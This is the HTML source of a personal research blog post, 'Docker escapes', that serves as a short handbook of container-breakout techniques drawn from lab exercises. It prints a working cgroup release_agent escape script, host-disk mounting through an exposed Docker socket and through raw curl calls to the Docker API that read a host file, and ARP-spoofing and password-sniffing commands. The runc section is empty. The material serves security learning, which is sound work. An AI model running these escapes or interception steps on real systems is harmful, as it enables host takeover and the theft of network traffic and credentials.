@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Docker escapes :: Research blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Exposed docker port ┌──(kali㉿kali)-[~/Documents/WithSecureLabs/dockerEscapes/lab1] └─$ docker -H 192.168.22.130:2375 info Native Overlay Diff: true userxattr: false Logging Driver: json-file Cgroup Driver: cgroupfs Cgroup Version: 1 Plugins: Volume: local Network: bridge host ipvlan macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc Default Runtime: runc Init Binary: docker-init containerd version: d71fcd7d8303cbf684402823e425e9dd2e99285d runc version: b9ee9c6314599f1b4a7f497e1f1f856fe433d3b7 init version: de40ad0 Security Options: apparmor seccomp Profile: default Kernel Version: 4." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://thomas-byrne.co.uk/research/docker/escapes/" />
+
+
+
+
+<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">
+
+  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Docker escapes :: Research blog">
+<meta property="og:description" content="This post is just a handbook of docker escapes" />
+<meta property="og:url" content="https://thomas-byrne.co.uk/research/docker/escapes/" />
+<meta property="og:site_name" content="Docker escapes" />
+
+  <meta property="og:image" content="https://thomas-byrne.co.uk/.">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    /home
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/hackthebox">HackTheBox</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">Show more ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/oscp">OSCP</a></li>
+              
+            
+              
+                <li><a href="/projects">Projects</a></li>
+              
+            
+              
+                <li><a href="/research">Research</a></li>
+              
+            
+              
+                <li><a href="/showcase">Showcase</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/hackthebox">HackTheBox</a></li>
+      
+    
+      
+        <li><a href="/oscp">OSCP</a></li>
+      
+    
+      
+        <li><a href="/projects">Projects</a></li>
+      
+    
+      
+        <li><a href="/research">Research</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://thomas-byrne.co.uk/research/docker/escapes/">Docker escapes</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-07-10 
+      </span>
+    
+    
+    <span class="post-author">:: Tom</span>
+    
+  </div>
+
+  
+
+  
+    <img src="https://thomas-byrne.co.uk/." class="post-cover" alt="Docker escapes" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="exposed-docker-port">Exposed docker port<a href="#exposed-docker-port" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/WithSecureLabs/dockerEscapes/lab1<span style="color:#f92672">]</span>         
+└─$ docker -H 192.168.22.130:2375 info                                 
+  Native Overlay Diff: true
+  userxattr: false
+ Logging Driver: json-file
+ Cgroup Driver: cgroupfs
+ Cgroup Version: <span style="color:#ae81ff">1</span>
+ Plugins:
+  Volume: local
+  Network: bridge host ipvlan macvlan null overlay
+  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
+ Swarm: inactive
+ Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc
+ Default Runtime: runc
+ Init Binary: docker-init 
+ containerd version: d71fcd7d8303cbf684402823e425e9dd2e99285d
+ runc version: b9ee9c6314599f1b4a7f497e1f1f856fe433d3b7
+ init version: de40ad0
+ Security Options:
+  apparmor
+  seccomp
+   Profile: default
+ Kernel Version: 4.19.0-17-amd64
+ Operating System: Debian GNU/Linux <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>buster<span style="color:#f92672">)</span>
+ OSType: linux
+ Architecture: x86_64
+ CPUs: <span style="color:#ae81ff">1</span>
+ Total Memory: 899.6MiB
+ Name: buster
+
+</code></pre></div><h1 id="privileged-container">Privileged container<a href="#privileged-container" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+mkdir /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mkdir /tmp/cgrp/x
+
+echo <span style="color:#ae81ff">1</span> &gt; /tmp/cgrp/x/notify_on_release
+host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
+echo <span style="color:#e6db74">&#34;</span>$host_path<span style="color:#e6db74">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
+
+echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd
+echo <span style="color:#e6db74">&#34;hostname &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd
+chmod a+x /cmd
+
+sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir -p /mnt/hola
+mount /dev/sda1 /mnt/hola
+</code></pre></div><h2 id="exploiting-exposed-socket">Exploiting Exposed socket<a href="#exploiting-exposed-socket" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#List images to use one</span>
+docker images
+<span style="color:#75715e">#Run the image mounting the host disk and chroot on it</span>
+docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
+</code></pre></div><h1 id="exposed-dockersock-with-curl--api">Exposed docker.sock with curl / API<a href="#exposed-dockersock-with-curl--api" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@62f69d202b3a:/$ curl --unix-socket docker.sock http://localhost/v1.41/containers/13e1568e2363cc35874f47cb032653ae94eb91f469b3bcd8f7383aacbd1527a0/exec -d <span style="color:#e6db74">&#39;{&#34;AttachStderr&#34;: true,&#34;AttachStdout&#34;: true,&#34;Tty&#34;:true,&#34;Cmd&#34;:[&#34;mkdir&#34;,&#34;-p&#34;,&#34;/mnt/hola&#34;]}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;c87daed87f046851f2b1a15dc813e6cb6086e0d3a9f3337299f8283a5b36ca02&#34;</span><span style="color:#f92672">}</span>
+
+root@62f69d202b3a:/$ curl --unix-socket docker.sock http://localhost/v1.41/exec/c87daed87f046851f2b1a15dc813e6cb6086e0d3a9f3337299f8283a5b36ca02/start -d <span style="color:#e6db74">&#39;{&#34;Tty&#34;:true}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+
+root@62f69d202b3a:/$ curl --unix-socket docker.sock http://localhost/v1.41/containers/13e1568e2363cc35874f47cb032653ae94eb91f469b3bcd8f7383aacbd1527a0/exec -d <span style="color:#e6db74">&#39;{&#34;AttachStderr&#34;: true,&#34;AttachStdout&#34;: true,&#34;Tty&#34;:true,&#34;Cmd&#34;:[&#34;mount&#34;,&#34;/dev/sda1&#34;,&#34;/mnt/hola&#34;]}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;ffd2b31260388f69af4b6df22c2b841400fbb51b14c1e04ce86742e2dd96317f&#34;</span><span style="color:#f92672">}</span>
+
+root@62f69d202b3a:/$ curl --unix-socket docker.sock http://localhost/v1.41/exec/ffd2b31260388f69af4b6df22c2b841400fbb51b14c1e04ce86742e2dd96317f/start -d <span style="color:#e6db74">&#39;{&#34;Tty&#34;:true}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+
+root@62f69d202b3a:/$ curl --unix-socket docker.sock http://localhost/v1.41/containers/13e1568e2363cc35874f47cb032653ae94eb91f469b3bcd8f7383aacbd1527a0/exec -d <span style="color:#e6db74">&#39;{&#34;AttachStderr&#34;: true,&#34;AttachStdout&#34;: true,&#34;Tty&#34;:true,&#34;Cmd&#34;:[&#34;cat&#34;,&#34;/mnt/hola/root/flag.txt&#34;]}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;13891b2e24ab49c5786f9cc4e96eaf99aea7012f4b40d95b8cf41549dcdd80cd&#34;</span><span style="color:#f92672">}</span>
+
+root@62f69d202b3a:/$ curl --unix-socket docker.sock http://localhost/v1.41/exec/13891b2e24ab49c5786f9cc4e96eaf99aea7012f4b40d95b8cf41549dcdd80cd/start -d <span style="color:#e6db74">&#39;{&#34;Tty&#34;:true}&#39;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span>
+w0ops13-i-exp0s3d-th3-un1x-s0ck3t
+
+</code></pre></div><h1 id="arp-spoof">Arp spoof<a href="#arp-spoof" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="ensure-ip-forwarding-is-on-so-packets-dont-die-when-they-are-directed-to-your-machine">Ensure IP forwarding is on so packets don&rsquo;t die when they are directed to your machine<a href="#ensure-ip-forwarding-is-on-so-packets-dont-die-when-they-are-directed-to-your-machine" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<pre tabindex="0"><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+
+sysctl -w net.ipv4.ip_forward=1
+</code></pre><h2 id="forward-requests-from-client-through-you">Forward requests from client through you<a href="#forward-requests-from-client-through-you" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">arpspoof -i INTERFACE_NAME -t CLIENT_IP SERVER_IP
+</code></pre></div><h2 id="forward-requests-from-server-through-you">Forward requests from server through you<a href="#forward-requests-from-server-through-you" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">arpspoof -i INTERFACE_NAME -t SERVER_IP CLIENT_IP
+</code></pre></div><h2 id="dump-the-data-youre-intercepting">Dump the data you&rsquo;re intercepting<a href="#dump-the-data-youre-intercepting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tcpdump -A src CLIENT_IP
+
+dsniff &lt;-- tool <span style="color:#66d9ef">for</span> sniffing passords but also comes with some other great packet sniffing tools like urlsnarf
+
+urlsnarf
+
+driftnet - picks out images from tcp streams
+</code></pre></div><h1 id="privileged-container-1">Privileged container<a href="#privileged-container-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mnt /dev/sda1 /mnt/&lt;MNT POINT&gt;
+</code></pre></div><h1 id="runc">runc<a href="#runc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
